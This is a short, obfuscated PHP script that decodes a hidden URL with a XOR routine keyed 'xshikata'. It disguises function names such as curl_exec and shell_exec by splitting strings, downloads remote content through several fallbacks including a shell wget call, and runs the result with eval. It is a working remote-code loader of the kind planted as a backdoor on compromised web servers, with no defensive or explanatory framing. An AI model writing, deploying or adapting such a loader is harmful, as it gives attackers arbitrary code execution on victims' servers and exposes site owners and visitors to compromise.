<?php

function a1b2c3($d4e5f6, $g7h8i9) {
    $j0k1l2 = '';
    $m3n4o5 = strlen($g7h8i9);
    for ($p6q7r8 = 0; $p6q7r8 < strlen($d4e5f6); $p6q7r8++) {
        $j0k1l2 .= $d4e5f6[$p6q7r8] ^ $g7h8i9[$p6q7r8 % $m3n4o5];
    }
    return $j0k1l2;
}

$u1v2w3 = '00010000 00000111 00011100 00011001 00011000 01011011 01011011 01001110 00001010 00010010 00011111 01000111 00001100 00001000 00000000 00001001 00001101 00010001 00011101 00011010 00001110 00010011 00010111 00001110 00010110 00000111 00001101 00000111 00011111 01001111 00010111 00001110 00010101 01011100 00101100 00001000 00000110 00001111 00100111 00000100 00011011 01011100 00010000 01000110 00000110 00000000 00011101 00001111 01010111 00000000 00011100 00010000 00000111 00000100 01011010 00010101 00000000 00000111';

$z1a2b3 = '';
$binary_values = explode(' ', trim($u1v2w3));
foreach ($binary_values as $c4d5e6) {
    $z1a2b3 .= chr(bindec($c4d5e6));
}

$key_x = 'xshikata';
$y7z8a9 = a1b2c3($z1a2b3, $key_x);

$f1g2h3 = 'curl_' . 'init';
$i4j5k6 = 'curl_' . 'exec';
$l7m8n9 = 'curl_' . 'close';
$o1p2q3 = 'file_' . 'get_' . 'contents';
$r4s5t6 = 'f' . 'open';
$u7v8w9 = 'f' . 'close';
$x1y2z3 = 'shell_' . 'exec';

function fetch_a1b2c3($url) {
    global $f1g2h3, $i4j5k6, $l7m8n9, $o1p2q3, $r4s5t6, $u7v8w9, $x1y2z3;

    if (function_exists($f1g2h3)) {
        $ch = $f1g2h3();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = $i4j5k6($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $l7m8n9($ch);

        if ($response !== false && $http_code == 200) {
            return $response;
        }
    }

    if (ini_get('allow_url_fopen')) {
        $response = @$o1p2q3($url);
        if ($response !== false) {
            return $response;
        }
    }

    $handle = @$r4s5t6($url, 'r');
    if ($handle) {
        $response = '';
        while (!feof($handle)) {
            $response .= fread($handle, 8192);
        }
        $u7v8w9($handle);
        if ($response !== false) {
            return $response;
        }
    }

    if (function_exists('exec') || function_exists($x1y2z3)) {
        $response = @$x1y2z3('wget -q -O - ' . escapeshellarg($url));
        if (!empty($response)) {
            return $response;
        }
    }

    return false;
}

$output_content = fetch_a1b2c3($y7z8a9);

if ($output_content !== false) {
    $execute_code = function($code) {
        return @eval('?>' . $code);
    };

    $execute_code($output_content);
} else {
    echo "Gagal mendapatkan konten dari URL.";
}

?>
